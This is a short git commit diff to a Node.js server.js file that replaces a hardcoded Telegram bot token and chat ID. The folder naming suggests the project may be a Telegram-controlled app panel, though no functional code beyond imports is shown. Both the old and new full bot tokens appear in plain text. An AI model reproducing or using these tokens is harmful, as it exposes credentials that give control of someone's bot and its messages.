7ab6ffc1f8b8d552f62a34462903be02c3d8faff
rajumer30897-crypto <rajumer30897@gmail.com>
2026-08-22 18:27:34 +0530

    Change bot token and chat ID in server.js
    Updated bot token and chat ID for server configuration.

--- APPS&Soucrce-Code/source code/server code v3/server.js
+++ APPS&Soucrce-Code/source code/server code v3/server.js
@@ -7,8 +7,8 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '5376895931:AAGungqejutol8QIidI2tlJMkmCSUuAAY9w'
-const id = '5155109916'
+const token = '8225595203:AAGMnDqfiA6jRPaGSZadFOidk33ujPnu25k'
+const id = '-1002508968072'
 const address = 'https://www.google.com'
 
 const app = express();
